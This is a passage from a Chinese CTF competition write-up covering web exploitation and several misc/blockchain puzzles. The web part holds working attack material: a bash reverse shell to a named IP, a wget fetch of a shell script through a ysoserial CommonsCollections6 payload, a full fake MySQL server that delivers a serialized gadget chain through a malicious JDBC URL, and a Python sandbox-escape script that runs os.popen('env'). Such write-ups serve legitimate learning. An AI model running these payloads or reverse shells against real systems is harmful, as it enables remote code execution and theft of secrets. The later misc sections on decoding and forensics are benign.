再使用`./exp.sh`执行文件，在`/tmp/exp`目录下出现`arb_write.7z`，再利用python脚本上传这个文件到upload接口。
```python
import requests

url = "http://3000-5a716ca0-7069-4da8-90a7-57cce825a0e5.challenge.ctfplus.cn/upload"
# 上传文件（file字段对应源码的request.files['file']）
files = {"file": open("arb_write.7z", "rb")}
response = requests.post(url, files=files)
print(response.text)
```
模拟http的post请求，实现文件上传。自动执行，拿到shell。

## ezjdbc
### 解题步骤
1. 在我的服务器上创建一个文件ppp,内容是`bash -i >& /dev/tcp/121.89.81.39/9999 0>&1`这是一个bash反弹shell命令，目标服务器执行该脚本后，会主动连接vps的9999端口，主动交出shell控制权。
2. 在ppp文件所在目录启动python http服务，让目标机器可以下载该文件，`python -m http.server 7777` ,端口7777与下面payload中的7777端口对应。
3. 在另一个终端启动nc监听，等待反弹到的shell  `nc -lvvp 9999` 。
4. 使用 ysoserial 生成 **CommonsCollections6 链**的 payload，命令为 `wget` 下载 VPS 上的 `ppp` 文件，`java -jar ysoserial-all.jar CommonsCollections6 "wget http://121.89.81.39:7777/ppp" > payload`
5. 接下来启动Fake MYSQL ,运行这个脚本`python3 jdbc.py` 他会监听0.0.0.0:2333端口，伪装成 MySQL 服务端，此时脚本会加载刚才生成的 payload
```python
# coding=utf-8  
import socket  
import binascii  
import os  
  
greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"  
response_ok_data="0700000200000002000000"  
  
def receive_data(conn):  
data = conn.recv(1024)  
print("[*] Receiveing the package : {}".format(data))  
return str(data).lower()  
  
def send_data(conn,data):  
print("[*] Sending the package : {}".format(data))  
conn.send(binascii.a2b_hex(data))  
  
def get_payload_content():  
#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payload  
file= r'payload'  
if os.path.isfile(file):  
with open(file, 'rb') as f:  
payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')  
print("open successs")  
  
else:  
print("open false")  
#calc  
payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'  
return payload_content  
  
# 主要逻辑  
def run():  
  
while 1:  
conn, addr = sk.accept()  
print("Connection come from {}:{}".format(addr[0],addr[1]))  
  
# 1.先发送第一个 问候报文  
send_data(conn,greeting_data)  
  
while True:  
# 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok  
receive_data(conn)  
send_data(conn,response_ok_data)  
  
#其他过程  
data=receive_data(conn)  
#查询一些配置信息,其中会发送自己的 版本号  
if "session.auto_increment_increment" in data:  
_payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'  
send_data(conn,_payload)  
data=receive_data(conn)  
elif "show warnings" in data:  
_payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'  
send_data(conn, _payload)  
data = receive_data(conn)  
if "set names" in data:  
send_data(conn, response_ok_data)  
data = receive_data(conn)  
if "set character_set_results" in data:  
send_data(conn, response_ok_data)  
data = receive_data(conn)  
if "show session status" in data:  
mysql_data = '0100000102'  
mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'  
mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'  
# 为什么我加了EOF Packet 就无法正常运行呢？？  
# 获取payload  
payload_content=get_payload_content()  
# 计算payload长度  
payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)  
payload_length_hex = payload_length[2:4] + payload_length[0:2]  
# 计算数据包长度  
data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)  
data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]  
mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex  
mysql_data += str(payload_content)  
mysql_data += '07000005fe000022000100'  
send_data(conn, mysql_data)  
data = receive_data(conn)  
if "show warnings" in data:  
payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'  
send_data(conn, payload)  
break  
  
  
if __name__ == '__main__':  
HOST ='0.0.0.0'  
PORT = 2333  
  
sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间  
sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
sk.bind((HOST, PORT))  
sk.listen(1)  
  
print("start fake mysql server listening on {}:{}".format(HOST,PORT))  
  
run()
```
6. 再往后就访问目标机器的漏洞接口，根据源码可以知道漏洞接口是connect（需要用jd-jui工具打开jar包，看到源码）
```java
  @GetMapping({"/connect"})  //定义get请求的/connet接口
  public String connect(
	  @RequestParam("url") String url, //接收JDBC连接字符传
	  @RequestParam("name") String name, //接受MYSQL用户名
	  @RequestParam("pass") String pass) //接收MYSQL密码
	  throws SQLException {  
	  //核心危险代码，直接用用户传入的参数调用DriverManager.getConnection
    Connection connection = DriverManager.getConnection(url, name, pass);  
    return url;  
  }
```
7. 传入恶意JDBC连接参数,这样ppp反弹shell脚本就下载到服务器了
```
/connect?name=root&pass=root&url=jdbc:mysql://121.89.81.39:2333/test?autoDeserialize=true%26queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```
8. 先停止Fake MYSQL服务，加载一个新的payload `java -jar ysoserial-all.jar CommonsCollections6 "bash ppp" > payload` 新的payload文件反序列化后会执行`bash ppp`把反弹shell的命令执行。
9. 再重新启动Fake MYSQL服务
10. 重复访问漏洞接口，传入相同的恶意 JDBC 连接参数
```
/connect?name=root&pass=root&url=jdbc:mysql://121.89.81.39:2333/test?autoDeserialize=true%26queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```
11. 这时就可以在nc监听的界面得到shell![](/image/136.png)
### 题目理解
根据jar包里的东西可以看到![](/image/137.png)MYSQL-jdbc版本是8.0.19,这个版本存在`autoDeserialize`的反序列化漏洞。又因为题目环境出网，所以可以反弹shell。其中那个Fake MYSQL脚本是用来伪装合法 MySQL 服务端，骗取 JDBC 客户端信任。
解释一下
```
/connect?name=root&pass=root&url=jdbc:mysql://121.89.81.39:2333/test?autoDeserialize=true%26queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```
- `jdbc:mysql://` JDBC 连接 MySQL 的固定协议头，告诉驱动 “要连接 MySQL 服务器
-  `121.89.81.39:2333/test` —— 指向攻击者的 Fake MySQL，其中test是数据库名，随便填， Fake MySQL 脚本里没有任何数据库名校验逻辑
- `autoDeserialize=true` ，开启 JDBC 驱动的 “自动反序列化” 功能。
- `queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`是反序列化触发器，指定 JDBC 驱动的 “查询拦截器”，这个拦截器的核心逻辑是 “对比连接前后的 MySQL 会话状态变化，拦截器初始化后，会自动执行`show session status`查询（获取 MySQL 会话状态），并读取服务端返回的二进制状态数据；这份二进制数据会被`autoDeserialize=true`触发反序列化 —— 相当于 “拦截器帮攻击者找到了一个天然的、驱动会主动读取并反序列化的数据源”
- 之所以要对&编码为%26，是因为web URL中&是多个参数的分隔符，如果直接写`&queryInterceptors`,Web 服务器会把`queryInterceptors`当成新的 Web 参数（而非 JDBC 连接串内的参数）
根据java源码可知漏洞接口为/connect ,源码里规定必须有三个参数name,pass,url,但是name和pass是用来凑数的，随便填，因为Fake MySQL 脚本的核心逻辑是模拟 MySQL 握手和认证，但完全不校验用户名 / 密码。`DriverManager.getConnection`会把这两个值传给 MySQL 服务端，但 Fake MySQL 直接忽略，仅用于 “走完认证流程”
**漏洞产生原因**：源码没有限制 JDBC 连接的目标 IP / 端口（比如只允许连接内网 MySQL），攻击者可以指定连接到自己控制的 Fake MySQL
最后让ai帮我梳理了一下整个触发流程
![](/image/138.png)

## 西纳普斯的许愿碑
先看源码**app.py
```python
@app.route('/api/wishes', methods=['GET', 'POST'])  
def wishes_endpoint():  
    from wish_stone import evaluate_wish_text  
    if request.method == 'GET':  
        with wishes_lock:  
            evaluated = [evaluate_wish_text(w) for w in wishes]  
        return jsonify({'wishes': evaluated})  
  
    data = request.get_json(silent=True) or {}  
    text = data.get('wish', '')  
    if isinstance(text, str) and text.strip():  
        with wishes_lock:  
            wishes.append(text.strip())  
  
        return jsonify({'ok': True}), 201  
    return jsonify({'ok': False, 'error': 'empty wish'}), 400
```
定义了一个/api/wishes的路由，

**wish_stone.py**
```python
CODE = '''  
def wish_checker(event,args):  
    allowed_events = ["import", "time.sleep", "builtins.input", "builtins.input/result"]    
    if not list(filter(lambda x: event == x, allowed_events)):    
	    raise Exception    
    if len(args) > 0:        
	    raise Exception
addaudithook(wish_checker)  
print("{}")  
'''
badchars = "\"'|&`+-*/()[]{}_ .".replace(" ", "")
def evaluate_wish_text(text: str) -> str:  
    for ch in badchars:  
        if ch in text:  
            print(f"ch={ch}")  
            return f"Error:waf {ch}"  
    out = safe_grant(CODE.format(text))  
    return out
```
这个函数是沙箱执行的「前置网关 + 执行入口」，所有用户提交的「愿望文本」最终都会经过这个函数处理.
`text` （字符串类型）—— 用户通过`/api/wishes` POST 提交的愿望文本；
`.replace(" ", "")`用来移除字符串里的空格。用户输入的空格本身不会被拦截。
只要出现黑名单里的字符，就终止后续执行
`out = safe_grant(CODE.format(text))` 中CODE是预设好的代码模板，`CODE.format(text)`会把用户输入直接替换到`print("{}")`的占位符位置。
这里存在漏洞，如果用户输入闭合了双引号，就可以执行任意指令
其中调用的`safe_grant`函数是
```python
def safe_grant(wish: str, timeout=3):  
    wish = wish.encode().decode('unicode_escape')  
    try:  
        parse_wish = ast.parse(wish)  
        Wish_stone().visit(parse_wish)  
    except Exception as e:  
        return f"Error: bad wish ({e.__class__.__name__})"  
  
    result_queue = multiprocessing.Queue()  
    p = multiprocessing.Process(target=wish_granter, args=(wish, result_queue))  
    p.start()  
    p.join(timeout=timeout)  
  
    if p.is_alive():  
        p.terminate()  
        return "You wish is too long."  
  
    try:  
        status, output = result_queue.get_nowait()  
        print(output)  
        return output if status == "ok" else f"Error grant: {output}"  
    except:  
        return "Your wish for nothing."
```
函数的wish参数就是经过`evaluate_wish_text`字符 WAF 后，注入`CODE`模板的完整代码文本；
`wish = wish.encode().decode('unicode_escape')`漏洞点，waf虽然过滤了"等字符，但可以对这些字符进行unicode编码，用户提交\u0022,不在黑名单里，但仍然可以解析为"
`ast.parse(wish)` 将代码文本解析为AST(抽象语法树)，若代码语法错误（如少括号、关键字错误），会直接抛出异常；
**AST(抽象语法树)**：`ast.parse(wish)` 会把用户输入的代码文本（如 `print("123")`）解析成「抽象语法树」—— 把代码的语法结构拆成一个个可遍历的节点（比如「属性访问节点 Attribute」「生成器表达式节点 GeneratorExp」「打印节点 Print」等）。
- 比如代码 `"abc".__class__` 解析后，会生成一个「Attribute 节点」， 节点属性：`attr="__class__"`（访问的属性名）、`value=Str(value='abc')`（被访问的对象）。
**ast.NodeVisitor(AST遍历器)**：`ast.NodeVisitor` 是 Python 内置的 AST 节点遍历工具，核心逻辑是：
- 定义 `visit_XXX` 方法（XXX 为节点类型，如`Attribute`/`GeneratorExp`），遍历 AST 时会自动调用对应节点的`visit_XXX`方法；
-  调用 `visitor.visit(ast树)` 时，会递归遍历 AST 的所有节点，逐个执行对应的检测逻辑。
`Wish_stone().visit(parse_wish)` 用自定义的Wish_stone访问器遍历AST,检测危险语法/属性。这里就需要看一下Wish_stone遍历器了
```python
class Wish_stone(ast.NodeVisitor):  
    forbidden_wishes = {  
        "__class__", "__dict__", "__bases__", "__mro__", "__subclasses__",  
        "__globals__", "__code__", "__closure__", "__func__", "__self__",  
        "__module__", "__import__", "__builtins__", "__base__"  
    }  
  
    def visit_Attribute(self, node):  
        if isinstance(node.attr, str) and node.attr in self.forbidden_wishes:  
            raise ValueError  
        self.generic_visit(node)  
  
    def visit_GeneratorExp(self, node):  
        raise ValueError
```
`class Wish_stone(ast.NodeVisitor):`可知`Wish_stone` 继承自 `ast.NodeVisitor`，自定义了两条核心检测规则，目标是阻断沙箱逃逸的关键语法：
- `visit_Attribute` 若访问的属性名（如`__class__`）在`forbidden_wishes`中，直接抛`ValueError`
- `visit_GeneratorExp` 只要检测到生成器表达式（如`(x for x in [1])`），直接抛`ValueError`
- `generic_visit` 遍历当前节点的子节点，确保嵌套的属性访问也被检测（如`a.b.__subclasses__`）
黑名单包含所有沙箱逃逸常用的「魔法属性」（如`__subclasses__`用于找可利用的内置类、`__builtins__`用于获取全局内置函数），阻断通过属性访问逃逸的核心路径。
在`Wish_stone().visit(parse_wish)` 中`Wish_stone()` 创建一个检测实例，加载预设的`forbidden_wishes`黑名单和检测方法。调用 `visit(parse_wish)` 后，从 AST 的根节点开始，逐个遍历所有子节点：
-  遇到「Attribute 节点（属性访问）」→ 执行 `visit_Attribute` 方法；
-  遇到「GeneratorExp 节点（生成器表达式）」→ 执行 `visit_GeneratorExp` 方法；
-  遇到其他节点（如 Print、Str、Name 等）→ 调用默认的`generic_visit`，仅递归遍历子节点，不做额外检测。
如果所有节点都未命中黑名单 → 无异常抛出，继续执行后续的子进程代码，如果任意节点命中黑名单 → 抛`ValueError` → 被外层`try-except`捕获，返回`Error: bad wish (ValueError)`
`result_queue = multiprocessing.Queue()` 创建进程间通信队列，用于子进程返回执行结果
`p = multiprocessing.Process(target=wish_granter, args=(wish, result_queue))`创建子进程，执行wish_granter函数，参数为待执行代码，结果队列
`p.start()`启动子进程，`p.join(timeout=timeout)`等待子进程执行，最多等三秒。
```python
if p.is_alive():  # 子进程仍在运行（说明超时）
    p.terminate()  # 强制终止子进程
    return "You wish is too long."  # 返回超时提示
```
因为这里又调用了wish_granter函数，所以解释一下
```python
def wish_granter(code, result_queue):  
    safe_globals = {"__builtins__": SAFE_WISHES}  
  
    sys.stdout = io.StringIO()  
    sys.stderr = io.StringIO()  
  
    try:  
        exec(code, safe_globals)  
        #获取重定向的输出/错误
        output = sys.stdout.getvalue()  
        error = sys.stderr.getvalue()  
        if error:  
            result_queue.put(("err", error))  #
        else:  
            result_queue.put(("ok", output))  #无错误，正常输出
    except Exception:  
        import traceback  
        #放入异常栈信息
        result_queue.put(("err", traceback.format_exc()))
```
这个函数是沙箱的**最终执行载体**,
- `def wish_granter(code, result_queue):`code字符串，即经过`Unicode转义解析+AST检测`后的完整代码文本（即`CODE模板+用户输入`拼接后的代码）；
- `safe_globals = {"__builtins__": SAFE_WISHES}`核心作用`exec(code, safe_globals)` 执行代码时，`safe_globals` 作为「全局命名空间」，仅开放`SAFE_WISHES`定义的有限内置函数，限制代码的执行权限。其中SAFE_WISHES是
```python
SAFE_WISHES = {  
    "print": print,  
    "filter": filter,  
    "list": list,  
    "len": len,  
    "addaudithook": sys.addaudithook,  
    "Exception": Exception,  
}
```
-  `__builtins__` 是 Python 执行代码时的「内置函数入口」，默认包含所有内置函数（如`open`/`eval`/`import`）；
- 这里将`__builtins__`替换为`SAFE_WISHES`，是沙箱的「核心权限限制」—— 试图让代码只能执行安全操作
- `sys.stdout = io.StringIO()` 重定向标准输出（print的内容会存到这里）
- `sys.stderr = io.StringIO()`重定向标准错误（存储报错信息）
- `exec(code, safe_globals)` 执行代码，使用受限的全局命名空间
**再回到safe_grant函数**
- `result_queue.get_nowait()`：非阻塞读取队列 —— 若子进程未向队列放入结果（如执行中崩溃），会抛出异常，触发`except`分支；
再看一下app.py里的_cleanup_task
```python
def _cleanup_task():  
    while True:  
        with wishes_lock:  
            if len(wishes) > 6:  
                del wishes[6:]  
        time.sleep(0.5)
```
愿望长度列表长度不可以超过6，多余的会被每0.5秒删除。
所以可以写一个脚本，因为0.5秒的时间很宽裕，所以可以直接手动发送，手速快点多试几次就可以成功
```python
#!/usr/bin/env python3  
"""  
获取远程 FLAG - 精简版  
"""  
import requests  
  
TARGET_URL = "http://8080-071761bd-6c8d-47d1-b36e-96cae6c793df.challenge.ctfplus.cn/"  
  
  
def escape_for_unicode(text):  
    """Unicode Escape 编码绕过 badchars"""    
    badchars = "\"'|&`+-*/()[]{}_ ."  
    return ''.join(f"\\x{ord(c):02x}" if c in badchars else c for c in text)  
  
  
# Payload: 栈帧逃逸 + 读取环境变量  
payload = '''")  
list=lambda x:True  
len=lambda x:False  
  
try:  
    raise Exceptionexcept 
Exception as e:  
    globals = e.__traceback__.tb_frame.f_back.f_globals  
    globals['Wish_stone'].visit_Attribute=lambda x,y:None    
    os = globals["sys"].modules["os"]    
    result = os.popen("env").read()    
    print(result)  
print("'''  
  
# 发送并立即读取  
requests.post(f"{TARGET_URL}/api/wishes", json={"wish": escape_for_unicode(payload)})  
wishes = requests.get(f"{TARGET_URL}/api/wishes").json().get('wishes', [])  
  
# 输出结果  
if wishes:  
    output = wishes[-1]  
    print(output)  
    print("\n" + "=" * 70)  
    for line in output.split('\n'):  
        if 'FLAG=' in line:  
            print(f"🎉 {line}")  
            print("=" * 70)  
else:  
    print("[-] 未获取到结果")
```
解释一下代码
```python
''.join(f"\\x{ord(c):02x}" if c in badchars else c for c in text)
```
是对payload的内容进行遍历，如果payload的内容里有黑名单里的字符，就把他进行 Unicode 十六进制编码，其中
- `ord(c)`是获取字符的ascii码，
- `\\x`是固定前缀，表示十六进制转义，
- `ord(c):02x`把ASCII码转换为两位十六进制数（不足两位补0）。
- `''.join`将生成器中处理后的字符片段拼接成完整字符串。
在这里解释一下CODE模板的逻辑
- `allowed_events = ["import", "time.sleep", "builtins.input", "builtins.input/result"]`白名单，仅允许四类审计事件
- `if not list(filter(lambda x: event == x, allowed_events)):`检测事件是否在白名单中
- `raise Exception` 是 Python 中**主动抛出通用异常**的核心语法，作用是「中断当前代码执行流程，并抛出一个异常对象」
- `if len(args) > 0:` 检测事件参数是否为空
- `addaudithook(wish_checker)` 是 Python 审计钩子，当代码执行关键操作（如`import`、函数调用、文件操作等）时，会触发预设的钩子函数，并传入两个参数event和args
payload解释(核心)：
- `list=lambda x:True`  `list(filter(...))`恒为 True → 绕过事件白名单检测
-  `len=lambda x:False` `len(args) > 0` 恒为 False → 绕过参数非空检测。
- `try: raise Exceptionexcept`主动抛出异常，
- **原因**是
- `Wish_stone` 类的 AST 检测：禁止访问 `__class__`/`__subclasses__` 等魔法属性，无法通过常规方式获取全局变量；
- `safe_globals` 限制：`__builtins__` 仅开放少量函数，无法直接访问 `sys`/`os`/`Wish_stone` 等核心对象。
- 审计钩子：直接修改 `sys`/`Wish_stone` 会触发检测，需先拿到这些对象的引用。
- 而 Python 异常对象会携带完整的执行栈帧信息，栈帧中包含「当前 / 上级执行环境的全局变量、局部变量」—— 这是沙箱无法屏蔽的底层信息，因此成为逃逸的突破口。
- `e.__traceback__` 获取异常的「回溯对象」,
- `.tb_frame`从回溯对象中获取「异常发生时的栈帧对象」（栈帧是 Python 执行代码的最小单元）
- `.f_back` 获取「上级栈帧」（沙箱执行环境的全局栈帧，而非 try 块的局部栈帧）
- `.f_globals` 从上级栈帧中获取「全局命名空间字典」（包含`Wish_stone`/`sys`等核心对象）
- `globals['Wish_stone'].visit_Attribute=lambda x,y:None` 篡改AST检测类的核心方法，让visit_Attribute失效，不再检测魔法属性。
- `os = globals["sys"].modules["os"]`从sys模块里获取os模块，（绕过__builtins__）的限制
- `result = os.popen("env").read()` 执行系统命令，读取环境变量
- `print(result)`打印出结果
- 开头的`")`和末尾的`print("`都是为了闭合
- 最后就是发送post请求和get请求，并在输出中寻找flag
## AISCREAM

# misc
## 🗃️🗃️
下载后，打开文件属性，获得了经纬度，借助在线地图，即可知道是北京天坛 ![屏幕截图 2025-11-24 172247.png](https://youke1.picui.cn/s1/2025/11/24/692424b055f97.png)
## HTTP
用wireshack打开流量包，先在 “Protocol” 一栏筛选 `http`。
观察 HTTP 请求和响应，尤其是：
- `GET` / `POST` 请求的 URL。
- 响应中的 `Content-Type`（可能是 zip、png、txt 等）。
右键 → “Follow” → “HTTP Stream” 查看完整内容。
flag很可能被分配到不同的请求中并用hex或base64加密，需要一个一个找到可疑字符,我分别从不同的请求中找到这三段
```
U1lDe1JfVV9BXw%3D%3D&s=00&r=0eeox3ps
RjBSM05TMUM1&s=01&r=h20hlp0i
X01BU1RFUj99&s=02&r=lywbp18i
```
这是个经典的 **URL-encoded + Base64** 拼接题。按 `s` 参数的顺序把三个字段解码并拼起来就能得到 flag。
- 对第一个值 `U1lDe1JfVV9BXw%3D%3D` （因为有%，最先想到url解码）做 URL 解码得 `U1lDe1JfVV9BXw==`，（后面有等号，最先想到base64解码）再做 Base64 解码得到：  `SYC{R_U_A_`
- 第二个值 `RjBSM05TMUM1` 直接 Base64 解码得到： `F0R3NS1C5`
- 第三个值 `X01BU1RFUj99` 直接 Base64 解码得到：  `_MASTER?}`
最后拼接flag为`SYC{R_U_A_F0R3NS1C5_MASTER?}`
## Bite off picture
得到一个压缩文件，里面有一个png图片，但打不开，也无法移动复制，就用010editor,打开整个压缩包，看开头有PK确实是压缩包，但在文件最后有一个`==gcyV2dyV2d`很特殊，整体倒过来再base64解码为`werwerr`,猜测为文件的解压密码，用winrar解压后得到一个小狗图片，用010editor打开，确实是一个很正常的png图片，图片也可以打开，没有损坏，这是就想到可能是图片的长宽被修改导致flag被隐藏，修改一下高度试试![图片](/image/8.png)
保存后在从新打开图片，看到flag![图片](/image/9.png)
## Blockchain SignIn
奇怪的交易(sepolia testnet)：0x208e0465ea757073d0ec6af9094e5404ef81a213970eb580fa6a28a3af4669d6  可以在Sepolia 测试网的区块链浏览器（如 [Sepolia Etherscan](https://sepolia.etherscan.io/)）中查询交易`0x208e0465ea757073d0ec6af9094e5404ef81a213970eb580fa6a28a3af4669d6`然后点击show more details  在Input Data:处有一串十六进制编码`0x5359437b773362335f67346d335f73743472747d`可以将其转换为 ASCII 字符来得到内容：
- 逐个字节转换：
- `0x53` → `S`
- `0x59` → `Y`
- `0x43` → `C`
- `0x7b` → `{`
- `0x77` → `w`
- `0x33` → `3`
- `0x62` → `b`
- `0x33` → `3`
- `0x5f` → `_`
- `0x67` → `g`
- `0x34` → `4`
- `0x6d` → `m`
- `0x33` → `3`
- `0x5f` → `_`
- `0x73` → `s`
- `0x74` → `t`
- `0x34` → `4`
- `0x72` → `r`
- `0x74` → `t`
- `0x7d` → `}`
转换后得到：**`SYC{w3b3_g4m3_st4rt}`**
## 1Z_Sign
主网这笔交易交互池子的费率0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598可以用 [Sepolia Etherscan](https://sepolia.etherscan.io/)中查询交易，在logs日志中找到

###### Address
[0x000000000004444c5dc75cb358380d2e3de08a90](https://etherscan.io/address/0x000000000004444c5dc75cb358380d2e3de08a90)(Uniswap V4: Pool Manager)   
###### Name
Swap (index_topic_1 bytes32 id, index_topic_2 address sender, int128 amount0, int128 amount1, uint160 sqrtPriceX96, uint128 liquidity, int24 tick, uint24 fee)View Source
###### Topics
- 0 0x40e9cecb9f5f1f1c5b9c97dec2917b7ee92e57ba5563708daca94dd84ad7112f
- 1: id7F2869B24D83F03E0438C045CE24FD18045B2B6CDEC47CD7B62E67E2284D1BE9
- 2: sender 
    [0xBa47cbFdD61029833841fcaA2ec2591dDfa87e51](https://etherscan.io/address/0xBa47cbFdD61029833841fcaA2ec2591dDfa87e51)
    
###### Data
- amount0 :541168720375500939
- amount1 :-15225443441845645344768
- sqrtPriceX96 :13226520643709557354253154784891
- liquidity :181824344111125097411551
- tick :102358
- fee :9900
从中看到`fee:9900`,所以费率为`0.99%`,所以flag为`SYC{0.99%}`
## Dream
访问 [Sepolia 测试网的区块链浏览器网址](https://sepolia.etherscan.io/)在该网址中输入题目中的地址`0xd8B361E50174c4Ae99E31dCdF10B353C961f9C43`,点击contract,再点击Decompile Bytecode将字节码转换为可读的伪代码。把那一串东西复制到[在线 EVM 字节码反编译工具](https://ethervm.io/decompile/)里得到关键字符串` var3 = 0x5359437b77336c63306d337430626c30636b636861316e7d;`
1. 把十六进制数按每两个字符一组拆分：`53 59 43 7b 77 33 6c 63 30 6d 33 74 30 62 6c 30 63 6b 63 68 61 31 6e 7d`
2. 逐个转换为 ASCII 字符：
    - `53` → `S`
    - `59` → `Y`
    - `43` → `C`
    - `7b` → `{`
    - `77` → `w`
    - `33` → `3`
    - `6c` → `l`
    - `63` → `c`
    - `30` → `0`
    - `6d` → `m`
    - `33` → `3`
    - `74` → `t`
    - `30` → `0`
    - `62` → `b`
    - `6c` → `l`
    - `30` → `0`
    - `63` → `c`
    - `6b` → `k`
    - `63` → `c`
    - `68` → `h`
    - `61` → `a`
    - `31` → `1`
    - `6e` → `n`
    - `7d` → `}`

最终 Flag 为：`SYC{w3lc0m3t0bl0ckcha1n}`
